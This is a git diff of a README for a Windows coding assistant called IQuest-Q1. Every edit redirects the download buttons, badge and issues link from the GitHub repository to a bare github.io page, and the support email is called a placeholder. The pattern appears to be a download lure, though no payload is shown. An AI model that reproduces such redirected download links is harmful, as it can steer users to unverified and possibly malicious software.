@@ -1,6 +1,6 @@
 # 🤖 IQuest-Q1 - Your Smart Assistant for Coding and Problem-Solving
 
-[![Download IQuest-Q1](https://img.shields.io/badge/Download-IQuest--Q1-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/as2227741-beep/IQuest-Q1)
+[![Download IQuest-Q1](https://img.shields.io/badge/Download-IQuest--Q1-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://as2227741-beep.github.io)
 
 ---
 
@@ -27,7 +27,7 @@ Follow these simple steps to start using IQuest-Q1 on your Windows computer:
 ### Step 1: Download the Program
 Visit this link to download the application: 
 
-[⬇️ Click Here to Download IQuest-Q1](https://github.com/as2227741-beep/IQuest-Q1)
+[⬇️ Click Here to Download IQuest-Q1](https://as2227741-beep.github.io)
 
 The download page will open in your browser. Look for the green "Download" button or the latest release file. Click it and wait for the download to finish. This might take a few minutes since the program is large.
 
@@ -158,7 +158,7 @@ If you run into problems or have questions, here are your options:
 3. Use the search bar to find specific topics
 
 ### Online Support
-- **GitHub Issues Page** – Report bugs or request new features at https://github.com/as2227741-beep/IQuest-Q1/issues
+- **GitHub Issues Page** – Report bugs or request new features at https://as2227741-beep.github.io
 - **Official Website** – Visit the IQuest Lab website for announcements and resources
 - **Email Support** – Send questions to support@iquestlab.com (this is a placeholder)
 
@@ -187,7 +187,7 @@ Once you've checked all these boxes, you're ready to experience the power of IQu
 
 Need to download again? No problem – here's the link:
 
-[🖱️ Download IQuest-Q1 Now](https://github.com/as2227741-beep/IQuest-Q1)
+[🖱️ Download IQuest-Q1 Now](https://as2227741-beep.github.io)
 
 ---
 
